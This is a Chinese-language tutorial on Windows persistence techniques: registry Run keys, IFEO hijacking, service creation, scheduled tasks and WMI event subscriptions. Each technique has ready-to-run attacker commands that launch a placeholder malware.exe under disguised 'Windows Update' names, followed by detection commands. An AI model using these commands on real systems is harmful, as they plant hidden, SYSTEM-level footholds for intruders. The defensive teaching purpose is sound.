# Windows 权限维持

### 6.1 注册表持久化

**启动项注册表键**

```
用户级启动项（当前用户权限）：
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx

系统级启动项（SYSTEM/管理员权限，取决于触发时机）：
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

其他启动位置：
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

**示例**

```powershell
# 添加启动项
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousUpdate" /t REG_SZ /d "C:\temp\malware.exe" /f

# 添加到 RunOnce（运行一次后自动删除）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\temp\malware.exe" /f
```

**映像劫持（IFEO）**

```
注册表位置：
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe_name>

设置 Debugger 值后，当目标程序启动时，会先启动 Debugger 指定的程序。
Debugger 程序接收目标程序路径作为命令行参数。

示例：
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\temp\malware.exe" /f

当用户启动 notepad.exe 时，实际上会运行 malware.exe
```

### 6.2 服务持久化

**服务持久化原理**

Windows 服务在系统启动时自动运行，通常以 SYSTEM 权限运行。创建新服务或修改现有服务是常见的持久化方法。

**创建服务**

```powershell
# 使用 sc 命令创建服务
sc create "UpdateService" binPath= "C:\temp\malware.exe" start= auto type= own
sc description "UpdateService" "Windows Update Service"
sc start "UpdateService"

# 使用 PowerShell 创建服务
New-Service -Name "UpdateService" -BinaryPathName "C:\temp\malware.exe" -StartupType Automatic -Description "Windows Update Service"
Start-Service -Name "UpdateService"
```

**服务持久化检测**

```powershell
# 列出所有服务
Get-Service | Select-Object Name, DisplayName, Status, StartType

# 列出自动启动的服务
Get-Service | Where-Object { $_.StartType -eq "Automatic" }

# 查看服务详情
Get-WmiObject -Class Win32_Service | Select-Object Name, PathName, StartName, StartMode

# 查看非 Microsoft 的服务
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike "*C:\Windows*" } | Select-Object Name, PathName, StartName

# 事件日志
# 事件 ID 4697：服务安装（安全日志）
# 事件 ID 7045：服务安装（系统日志）
```

### 6.3 计划任务持久化

**计划任务持久化原理**

计划任务可以配置为在特定时间、特定事件或系统启动时执行程序。计划任务可以配置运行账户，支持以 SYSTEM 权限运行。

**创建计划任务**

```powershell
# 使用 schtasks 创建任务
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\malware.exe" /sc onstart /ru SYSTEM /f

# 使用 PowerShell 创建任务
$action = New-ScheduledTaskAction -Execute "C:\temp\malware.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Windows Automatic Update"
```

**计划任务检测**

```powershell
# 列出所有计划任务
Get-ScheduledTask | Select-Object TaskName, TaskPath, State

# 查看任务详情
Get-ScheduledTask | ForEach-Object {
    [PSCustomObject]@{
        TaskName = $_.TaskName
        Execute = ($_.Actions | Select-Object -ExpandProperty Execute)
        Arguments = ($_.Actions | Select-Object -ExpandProperty Arguments)
        UserId = $_.Principal.UserId
        RunLevel = $_.Principal.RunLevel
        Triggers = ($_.Triggers | ForEach-Object { $_.StartBoundary + " " + $_.Enabled })
    }
}

# 检测可疑任务
# 1. 以 SYSTEM 运行的自定义任务
# 2. 执行路径在临时目录的任务
# 3. 隐藏的任务
```

### 6.4 WMI 事件订阅持久化

**WMI 持久化原理**

WMI 事件订阅可以在特定系统事件发生时触发脚本或命令执行。WMI 持久化具有隐蔽性强、无文件（存储在 WMI 仓库中）等特点。

**WMI 持久化组件**

1. **事件过滤器（EventFilter）**：定义触发条件（什么事件）
2. **事件消费者（EventConsumer）**：定义触发后执行的操作
3. **过滤器消费者绑定（FilterToConsumerBinding）**：将过滤器和消费者关联

**常见事件触发器**

- 系统启动（__InstanceModificationEvent 监控 Win32_OperatingSystem）
- 用户登录（__InstanceCreationEvent 监控 Win32_LogonSession）
- 定时触发（__TimerEvent）
- 进程创建（__InstanceCreationEvent 监控 Win32_Process）

**WMI 持久化示例**

```powershell
# 创建事件过滤器（系统启动后触发）
$filter = ([wmiclass]"root\subscription:__EventFilter").CreateInstance()
$filter.Name = "WindowsUpdateFilter"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.QueryLanguage = "WQL"
$filter.EventNamespace = "root\cimv2"
$filter.Put()

# 创建事件消费者（执行命令）
$consumer = ([wmiclass]"root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "WindowsUpdateConsumer"
$consumer.CommandLineTemplate = "cmd.exe /c C:\temp\malware.exe"
$consumer.Put()

# 创建绑定
$binding = ([wmiclass]"root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = "__EventFilter.Name='WindowsUpdateFilter'"
$binding.Consumer = "CommandLineEventConsumer.Name='WindowsUpdateConsumer'"
$binding.Put()
```

**WMI 持久化检测**

```powershell
# 列出所有事件过滤器
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query

# 列出所有事件消费者
Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Select-Object Name, __CLASS

# 列出所有绑定
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select-Object Filter, Consumer

# 使用 Autoruns 检测
# autorunsc.exe -a wmi  # 列出 WMI 持久化
```

---

---

